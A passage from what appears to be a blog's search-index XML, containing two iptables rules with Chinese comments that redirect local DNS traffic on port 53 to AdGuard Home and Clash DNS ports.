-t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 54 <span class="hljs-comment">#将目标端口为53的流量重定向到本机54端口,54端口为AdGuard_Home</span><br>iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 55 <span class="hljs-comment">#将目标端口为53的流量重定向到本机的55端口,55端口为clash dns</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
